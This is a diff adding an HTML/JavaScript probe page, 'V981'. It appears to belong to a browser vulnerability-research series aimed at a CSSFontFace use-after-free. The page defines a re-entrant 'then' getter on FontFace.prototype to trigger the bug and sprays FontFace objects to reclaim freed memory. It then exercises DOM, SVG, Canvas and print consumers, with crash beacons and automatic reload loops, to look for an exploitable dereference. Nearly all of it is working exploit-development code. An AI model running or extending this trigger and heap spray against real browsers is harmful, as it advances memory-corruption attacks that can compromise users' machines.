@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V981 - FontFace fake-loaded consumer probe (DOM/SVG/Canvas)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V981 - Can a fake-loaded CSSFontFace be consumed dangerously?</h1>
+
+<p class="key">
+<b>Why V981:</b> V980 proved the trigger is a reliable single-face status flip with survival
+(<code>hit=1</code>, one of 64 sprayed faces becomes <code>loaded</code>, controls stay
+<code>unloaded</code>), and that any non-<code>CSSFontFace</code> reclaim dies in the
+<code>setStatus</code> tail (<code>m_timeoutTimer.stop()</code>). So the only survivable reclaim is a
+real <code>CSSFontFace</code>, and the only observable effect is <code>m_status=Loaded</code> on a face
+that was never loaded (<b>fake-loaded</b>: <code>m_font</code> is still null).
+This probe asks the last question: does any consumer trust <code>status()</code>/<code>check()</code>
+and then dereference the missing font? It runs the same trigger, then feeds the hit family to
+<b>DOM text, SVG &lt;text&gt; (getBBox/getComputedTextLength), Canvas 2D fillText + pixel readback,
+weight/style mismatch matching, and an SVG data-URL image</b>. Every step is preceded by a
+<code>PHASE</code> beacon so a crash maps to the exact consumer.
+<b>Cases:</b> <code>ctx</code> (default) | <code>control</code> | <code>all</code> (cascade).
+<code>&amp;k=N</code> spray (64), <code>&amp;arm=0</code> baseline, <code>&amp;print=1</code> optional
+<code>window.print()</code>, <code>&amp;stop=1</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var Q = function (k, d) { var m = location.search.match(new RegExp('[?&]' + k + '=(\\d+)')); return m ? parseInt(m[1], 10) : d; };
+var CASE = (location.search.match(/case=(ctx|control|all)/) || [])[1] || 'ctx';
+var K = Math.min(Math.max(Q('k', 64), 8), 256);
+var ARM = location.search.indexOf('arm=0') < 0;
+var STOP = location.search.indexOf('stop=1') >= 0;
+var DO_PRINT = location.search.indexOf('print=1') >= 0;
+var MAXLOADS = Math.min(Math.max(Q('maxloads', 8), 4), 40);
+var KSUF = Date.now().toString(36).slice(-5) + Math.random().toString(36).slice(2, 5);
+var FAMILY = 'v981v' + KSUF;
+var KFAMPREFIX = 'v981k' + KSUF;
+
+function lsGet(k) { try { return window.localStorage.getItem('v981_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v981_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v981_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V981-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 80) : 'none'; }
+function safeProp(obj, name) {
+  try { var v = obj[name]; return (v == null) ? String(v) : String(v).slice(0, 60); }
+  catch (e) { return 'ERR:' + errOf(e); }
+}
+function phase(name, extra) { bks('PHASE', 'p=' + name + (extra ? ',' + extra : '')); }
+function reloadSoon(ms) {
+  if (STOP) { bks('STOPPED', 'no reload (stop=1)'); return; }
+  setTimeout(function () {
+    location.href = SEEK + '?op=auto&case=' + CASE + '&k=' + K + '&maxloads=' + MAXLOADS +
+                    (ARM ? '' : '&arm=0') + (DO_PRINT ? '&print=1' : '') + '&r=' + Date.now();
+  }, ms);
+}
+
+var VICT = [], KFACES = [], TRIG_FIRED = 0, STAGE_DONE = 0;
+
+function findCssFace(family) {
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      if (String(e.value.family).replace(/['"]/g, '') === family) return e.value;
+    }
+  } catch (e2) {}
+  return null;
+}
+
+function makeVictim(tag) {
+  var fam = FAMILY + tag;
+  var st = document.createElement('style');
+  st.id = 'v981style_' + tag;
+  st.textContent = "@font-face { font-family: '" + fam + "'; src: local('Arial'); }";
+  document.head.appendChild(st);
+  document.body.offsetHeight;
+  var rule = null;
+  try { rule = st.sheet.cssRules[0]; } catch (e) {}
+  var f = findCssFace(fam);
+  return { style: st, rule: rule, face: f, fam: fam };
+}
+
+/* ---------- reclaim population: real FontFaces only (the tail requires a valid CSSFontFace) ---------- */
+
+function doFaceSpray(stage, n) {
+  var faces = [], made = 0, i, f;
+  for (i = 0; i < n; i++) {
+    try {
+      f = new FontFace(KFAMPREFIX + 's' + stage + '_' + i, 'local("Nope' + KSUF + i + '")');
+      document.fonts.add(f);
+      faces.push(f); made++;
+    } catch (e) {
+      bks('SPRAYERR', 'stage=' + stage + ',i=' + i + ',' + errOf(e));
+      break;
+    }
+  }
+  KFACES = KFACES.concat(faces);
+  bks('FACEWAVE', 'stage=' + stage + ',k=' + n + ',made=' + made);
+}
+
+/* ---------- trigger ---------- */
+
+var ACTIVE = null;
+
+function installGetter() {
+  try {
+    Object.defineProperty(FontFace.prototype, 'then', {
+      get: function () {
+        if (!LIVE_TRIGGER) return undefined;
+        TRIG_FIRED++;
+        var stage = TRIG_FIRED;
+        var maxStage = (CASE === 'all') ? 3 : 1;
+        if (stage > maxStage) return undefined;
+        if (!ARM) {
+          if (stage === 1) bks('TRIG', 'case=' + CASE + ',status=' + (ACTIVE && ACTIVE.face ? ACTIVE.face.status : '?') + ',arm=0');
+          return undefined;
+        }
+        STAGE_DONE = stage;
+        try {
+          var v = ACTIVE;
+          bks('CASCADE-STAGE', 'stage=' + stage + ',victim=' + (v ? v.fam : '?') +
+              ',status=' + (v && v.face ? v.face.status : '?'));
+          if (v && v.rule) {
+            try { v.rule.style.setProperty('font-weight', (stage % 2) ? 'bold' : 'normal'); } catch (eR) {}
+          }
+          document.body.offsetHeight;
+          doFaceSpray(stage, stage === 1 ? K : (stage === 2 ? 32 : 16));
+          if (CASE === 'all' && stage < maxStage) {
+            var nv = makeVictim('c' + stage);
+            var r, threw = 'none';
+            if (nv && nv.face) {
+              ACTIVE = nv;
+              try { r = nv.face.load(); } catch (e2) { threw = errOf(e2); }
+            }
+            bks('CASCADE-NEST', 'stage=' + stage + ',next=' + (stage + 1) +
+                ',fresh=' + (nv && nv.face ? nv.face.status : '?') +
+                ',ret=' + (r && r.constructor ? r.constructor.name : typeof r) + ',threw=' + threw);
+          }
+        } catch (e) { bks('TRIGERR', 'stage=' + stage + ',' + errOf(e)); }
+        return undefined;
+      },
+      configurable: true
+    });
+  } catch (e) { bks('ERR', 'defineProperty:' + errOf(e)); }
+}
+
+var LIVE_TRIGGER = false;
+
+/* ---------- consumers ---------- */
+
+function chk(fam, text) {
+  try {
+    return (text === undefined)
+      ? String(document.fonts.check('48px "' + fam + '"'))
+      : String(document.fonts.check('48px "' + fam + '"', text));
+  } catch (e) { return 'ERR:' + errOf(e); }
+}
+
+function domTest(kind, fam) {
+  phase(kind + ':dom');
+  try {
+    var d = document.createElement('div');
+    d.style.cssText = 'position:absolute;left:-9999px;top:0;font-size:48px;font-family:"' + fam + '";white-space:nowrap';
+    d.textContent = 'HELLO WORLD';
+    document.body.appendChild(d);
+    var w = d.offsetWidth, h = d.offsetHeight;
+    var r = d.getBoundingClientRect();
+    bks(kind + '-DOM', 'w=' + w + ',h=' + h + ',rect=' + r.width.toFixed(1) + 'x' + r.height.toFixed(1));
+    d.parentNode.removeChild(d);
+  } catch (e) { bks(kind + '-DOMERR', errOf(e)); }
+}
+
+function svgTest(kind, fam) {
+  phase(kind + ':svg');
+  try {
+    var ns = 'http://www.w3.org/2000/svg';
+    var svg = document.createElementNS(ns, 'svg');
+    svg.setAttribute('width', '320'); svg.setAttribute('height', '120');
+    svg.style.position = 'absolute'; svg.style.left = '-9999px';
+    var t = document.createElementNS(ns, 'text');
+    t.setAttribute('x', '5'); t.setAttribute('y', '60');
+    t.setAttribute('font-family', '"' + fam + '"');
+    t.setAttribute('font-size', '48');
+    t.textContent = 'HELLO';
+    svg.appendChild(t);
+    document.body.appendChild(svg);
+    var bb = t.getBBox();
+    var len = -1;
+    try { len = t.getComputedTextLength(); } catch (e2) { len = 'ERR'; }
+    bks(kind + '-SVG', 'bbox=' + bb.width.toFixed(2) + 'x' + bb.height.toFixed(2) + ',len=' + (typeof len === 'number' ? len.toFixed(2) : len));
+    svg.parentNode.removeChild(svg);
+  } catch (e) { bks(kind + '-SVGERR', errOf(e)); }
+}
+
+function canvasTest(kind, fam) {
+  phase(kind + ':canvas');
+  try {
+    var c = document.createElement('canvas');
+    c.width = 320; c.height = 120;
+    var x = c.getContext('2d');
+    x.fillStyle = '#ffffff'; x.fillRect(0, 0, 320, 120);
+    x.fillStyle = '#000000'; x.font = '48px "' + fam + '"'; x.textBaseline = 'middle';
+    var m = x.measureText('HELLO');
+    x.fillText('HELLO', 5, 60);
+    var d = x.getImageData(0, 0, 320, 120).data, n = 0, i;
+    for (i = 0; i < d.length; i += 4) { if (d[i] < 128) n++; }
+    bks(kind + '-CANVAS', 'measure=' + m.width.toFixed(2) + ',blackPx=' + n);
+  } catch (e) { bks(kind + '-CANVASERR', errOf(e)); }
+}
+
+function matchTest(kind, fam) {
+  phase(kind + ':match');
+  try {
+    var d = document.createElement('div');
+    d.style.cssText = 'position:absolute;left:-9999px;top:0;font-size:40px;font-family:"' + fam + '";font-weight:bold;font-style:italic';
+    d.textContent = 'WWWW';
+    document.body.appendChild(d);
+    var w = d.offsetWidth, h = d.offsetHeight;
+    bks(kind + '-MATCH', 'boldItalic=' + w + 'x' + h);
+    d.parentNode.removeChild(d);
+  } catch (e) { bks(kind + '-MATCHERR', errOf(e)); }
+}
+
+function svgImgTest(kind, fam) {
+  phase(kind + ':svgimg');
+  try {
+    var svg = '<svg xmlns="http://www.w3.org/2000/svg" width="320" height="120">' +
+              '<text x="5" y="60" font-family="' + fam + '" font-size="48">HELLO</text></svg>';
+    var img = new Image();
+    img.onload = function () { bks(kind + '-SVGIMG', 'loaded,w=' + img.naturalWidth + ',h=' + img.naturalHeight); };
+    img.onerror = function () { bks(kind + '-SVGIMG', 'error'); };
+    img.style.position = 'absolute'; img.style.left = '-9999px';
+    img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
+    document.body.appendChild(img);
+  } catch (e) { bks(kind + '-SVGIMGERR', errOf(e)); }
+}
+
+function runBattery(face, idx, kind) {
+  /* family may come back quoted depending on how the face was declared; strip quotes so the
+     consumers below build a valid font-family instead of silently falling back (false negative). */
+  var fam = safeProp(face, 'family').replace(/['"]/g, '');
+  bks(kind + '-FACE', 'idx=' + idx + ',status=' + safeProp(face, 'status') + ',fam=' + fam);
+  phase(kind + ':check');
+  bks(kind + '-CHECK', 'plain=' + chk(fam) + ',text=' + chk(fam, 'HELLO'));
+
+  phase(kind + ':loaded');
+  try {
+    var lp = face.loaded;
+    Promise.race([lp, Promise.resolve('__m__')]).then(
+      function (v) { bks(kind + '-LOADED', 'first=' + (v === '__m__' ? 'pending' : 'settled')); },
+      function (r) { bks(kind + '-LOADED', 'rejected,' + String(r).slice(0, 30)); }
+    );
+  } catch (e) { bks(kind + '-LOADEDERR', errOf(e)); }
+
+  phase(kind + ':fload');
+  try {
+    var fp = document.fonts.load('48px "' + fam + '"', 'HELLO');
+    Promise.race([fp, Promise.resolve('__m2__')]).then(
+      function (v) { bks(kind + '-FLOAD', 'first=' + (v === '__m2__' ? 'pending' : (Array.isArray(v) ? 'arr' + v.length : 'other'))); },
+      function (r) { bks(kind + '-FLOAD', 'rejected,' + String(r).slice(0, 30)); }
+    );
+  } catch (e) { bks(kind + '-FLOADERR', errOf(e)); }
+
+  domTest(kind, fam);
+  svgTest(kind, fam);
+  canvasTest(kind, fam);
+  matchTest(kind, fam);
+  svgImgTest(kind, fam);
+
+  if (DO_PRINT) {
+    phase(kind + ':print');
+    try {
+      if (typeof window.print === 'function') { window.print(); bks(kind + '-PRINT', 'called'); }
+      else bks(kind + '-PRINT', 'unavailable');
+    } catch (e) { bks(kind + '-PRINTERR', errOf(e)); }
+  }
+
+  bks(kind + '-BATTERYDONE', 'idx=' + idx);
+}
+
+/* ---------- scan ---------- */
+
+function scanFaces() {
+  var hits = [], total = 0, other = [], hitFaces = [];
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      var f = e.value;
+      var fam = String(f.family).replace(/['"]/g, '');
+      if (fam.indexOf(KFAMPREFIX) !== 0) continue;
+      total++;
+      var s = String(f.status);
+      var idxStr = fam.slice(KFAMPREFIX.length);
+      if (s === 'loaded' || s === 'error') { hits.push(idxStr + ':' + s); hitFaces.push({ f: f, idx: idxStr, s: s }); }
+      else if (s !== 'unloaded') other.push(idxStr + ':' + s);
+    }
+  } catch (e2) { bks('FSCANERR', errOf(e2)); }
+  var stages = {};
+  for (var i = 0; i < hits.length; i++) {
+    var m = /^s(\d+)_/.exec(hits[i]);
+    if (m) stages[m[1]] = (stages[m[1]] || 0) + 1;
+  }
+  bks('FACESCAN', 'case=' + CASE + ',k=' + K + ',total=' + total + ',hits=' + hits.length +
+      ',other=' + other.length + ',stageHits=' + JSON.stringify(stages) +
+      ',trig=' + TRIG_FIRED + ',victimFace=' + (VICT[0] && VICT[0].face ? VICT[0].face.status : '?') +
+      ',fonts=' + (function () { try { return document.fonts.size; } catch (e3) { return '?'; } })());
+  if (hits.length) bks('HIT', 'STATUS-WRITEBACK:' + hits.join('|').slice(0, 380));
+  else bks('NOHIT', 'all sprayed faces still unloaded (no writeback)');
+  if (other.length) bks('FOTHER', other.join('|').slice(0, 300));
+  return hitFaces;
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+function main() {
+  if (location.search.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('tries'); lsDel('phase');
+    bks('RESET', 'cleared,case=' + CASE);
+    say('cleared. reopening in 1.5s...');
+    setTimeout(function () {
+      location.href = SEEK + '?op=auto&case=' + CASE + '&k=' + K + '&maxloads=' + MAXLOADS +
+                      (ARM ? '' : '&arm=0') + (DO_PRINT ? '&print=1' : '') + '&r=' + Date.now();
+    }, 1500);
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > MAXLOADS) {
+    lsSet('phase', 'done');
+    bks('GIVEUP', 'loads=' + loads + ',case=' + CASE + ',k=' + K);
+    say('give up (phase=done) - reset with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    bks('CRASH', 'pending=' + pend + ',try=' + triesOf() + ',load=' + loads + ',case=' + CASE);
+    say('CRASH pending=' + pend);
+    reloadSoon(4000); return;
+  }
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var tryN = bumpTry();
+  bks('ENV', 'case=' + CASE + ',k=' + K + ',arm=' + (ARM ? 1 : 0) + ',try=' + tryN + ',load=' + loads +
+      ',devMs=' + Date.now() + ',ua=' + navigator.userAgent.slice(0, 90));
+  bks('BOOT', 'load=' + loads + ',try=' + tryN + ',family=' + FAMILY);
+
+  VICT = [];
+  var v0 = makeVictim('m0');
+  if (!v0.face) { bks('ERR', 'NO-FACE stage=0'); reloadSoon(4000); return; }
+  VICT.push(v0);
+  bks('SETUP', 'victims=' + VICT.length + ',status=' + v0.face.status + ',rule=' + (v0.rule ? 'yes' : 'no'));
+
+  installGetter();
+
+  lsSet('pending', 'v981:case=' + CASE + ':try=' + tryN + ':devMs=' + Date.now());
+  bks('LOADPRE', 'eager-loaded-access then face.load');
+
+  var p;
+  try {
+    ACTIVE = VICT[0];
+    var eager = VICT[0].face.loaded;
+    bks('EAGER', 'face.loaded accessed,type=' + (eager && eager.constructor ? eager.constructor.name : typeof eager));
+    LIVE_TRIGGER = true;
+    p = VICT[0].face.load();
+    LIVE_TRIGGER = false;
+  } catch (e) {
+    LIVE_TRIGGER = false;
+    lsDel('pending'); bks('LOADERR', errOf(e)); reloadSoon(4000); return;
+  }
+
+  function after() {
+    if (SCANNED) return;
+    SCANNED = true;
+    try {
+      bks('DONE', 'try=' + tryN + ' complete,trig=' + TRIG_FIRED + ',stages=' + STAGE_DONE + ',case=' + CASE);
+      say('done trig=' + TRIG_FIRED + ' stages=' + STAGE_DONE);
+      setTimeout(function () {
+        if (!ARM) { try { doFaceSpray(1, K); } catch (eS) { bks('SPRAYERR', 'baseline:' + errOf(eS)); } }
+        var hits = [];
+        try { hits = scanFaces(); } catch (e1) { bks('SCANERR', errOf(e1)); }
+        /* Remove the trigger getter before the consumer battery so document.fonts.load() sees a
+           normal (non-thenable) FontFace instead of re-entering our getter. */
+        try { delete FontFace.prototype.then; } catch (e2) {}
+        if (ARM && hits.length) {
+          /* prefer a real 'loaded' flip over an 'error' face when both appear */
+          var pick = hits[0];
+          for (var hi = 0; hi < hits.length; hi++) { if (hits[hi].s === 'loaded') { pick = hits[hi]; break; } }
+          runBattery(pick.f, pick.idx, 'HIT');
+        } else if (!ARM && KFACES.length) {
+          runBattery(KFACES[0], 's1_0', 'BASE');
+        }
+        setTimeout(function () {
+          lsDel('pending');
+          bks('RELEASED', 'pending cleared after grace');
+          reloadSoon(300);
+        }, 2500);
+      }, 700);
+    } catch (e) {
+      bks('FATAL', errOf(e)); lsDel('pending'); reloadSoon(4000);
+    }
+  }
+
+  var SCANNED = false;
+  try { p.then(after, after); } catch (e) { try { p.then(after)['catch'](after); } catch (e2) { after(); } }
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
